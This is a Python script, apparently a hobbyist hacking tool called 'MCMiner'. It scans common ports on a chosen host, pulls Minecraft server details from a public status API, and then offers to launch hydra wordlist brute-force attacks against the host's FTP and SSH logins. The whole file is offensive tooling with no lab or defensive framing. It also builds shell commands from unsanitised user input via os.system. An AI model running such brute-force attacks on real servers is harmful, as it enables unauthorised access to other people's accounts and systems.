import socket
from colorama import Fore, init
import requests
import os

Fore.LR = Fore.LIGHTRED_EX
Fore.LG = Fore.LIGHTGREEN_EX
Fore.W = Fore.LIGHTWHITE_EX
Fore.B = Fore.BLUE
Fore.LB = Fore.LIGHTBLUE_EX
Fore.R = Fore.RESET
Fore.Y = Fore.YELLOW
Fore.LBEX = Fore.LIGHTBLACK_EX
Fore.LWEX = Fore.LIGHTWHITE_EX

init()

TryFTP = False
TrySSH = False
ScrapeWeb = False

os.system('title MCMiner by wfsec')

print(f'''

{Fore.LG}        
{Fore.GREEN}                ███╗   ███╗██╗███╗   ██╗███████╗██████╗ 
{Fore.LG}                ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗
{Fore.GREEN}                ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝
{Fore.LG}                ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗
{Fore.GREEN}                ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║
{Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
''')
print('')
ip = input('            IP: ')

server_ip = socket.gethostbyname(ip)

print('')
print('')


global proto, s
ports = [21, 22, 23, 53, 80, 443, 3389, 8080, 19312, 25565]

for x in ports:
    if x == 21:
        proto = 'FTP'
    elif x == 22:
        proto = 'SSH'
    elif x == 23:
        proto = 'TELNET'
    elif x == 53:
        proto = 'DNS'
    elif x == 80:
        proto = 'HTTP'
    elif x == 443:
        proto = 'HTTPS'
    elif x == 3389:
        proto = 'RDP'
    elif x == 8080:
        proto = 'ALT HTTP'
    elif x == 19312:
        proto = 'Bedrock'
    elif x == 25565:
        proto = 'Java'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)  # If host does not react after 3 seconds, it closes
    result = s.connect_ex((ip, x))
    if result == 0:
        if x == 21:
            TryFTP = True
        if x == 22:
            TrySSH = True
        if x == 80:
            ScrapeWeb = True
        print(f'{Fore.LG}       [+]{Fore.W} Port {x} is open on [{ip}] {Fore.YELLOW}[{x}/{proto}]{Fore.W}')
        s.close()
    else:
        print(f'{Fore.LR}       [-]{Fore.W} Port {x} is closed on [{ip}] {Fore.YELLOW}[{x}/{proto}]{Fore.W}')
        s.close()


theurl = f'https://api.mcsrvstat.us/2/{ip}'
r = requests.get(theurl)
data = r.text

print('')

SRV = r.json().get("srv")
SERVER_IP = r.json().get("ip")
ONLINE_MODE = r.json().get("online")
VERSION = r.json().get("version")
QUERY = r.json().get("query")

print(f'''
            {Fore.RED}Query:{Fore.R} {QUERY}
            {Fore.RED}Version:{Fore.R} {VERSION}
            {Fore.RED}Online Mode:{Fore.R} {ONLINE_MODE}
            {Fore.RED}Server IP:{Fore.R} {SERVER_IP}
            {Fore.RED}SRV:{Fore.R} {SRV}
''')

if ScrapeWeb:
    WebASK = input('            Do you want to information about website? y/n: ')
    if WebASK == 'y':
        r = requests.get(f'http://{ip}')
        for res in r.history:
            print(f'               {Fore.LB}[{r.status_code}]{Fore.W} Redirected to{Fore.LWEX} {res.url}')
    else:
        print('               Ok.')
        pass


if TryFTP:
    print('')
    FTPASK = input('            Do you want to Wordlist attack on FTP? y/n: ')
    if FTPASK == 'y':
        the_proto = 'ftp'
        ftp_username_wordlist = input('             Username Wordlist: ')
        ftp_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                ''')
        pass


if TrySSH:
    print('')
    SSHASK = input('            Do you want to Wordlist attack on SSH? y/n: ')
    if SSHASK == 'y':
        the_proto = 'ssh'
        ssh_username_wordlist = input('             Username Wordlist: ')
        ssh_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                ''')
        pass
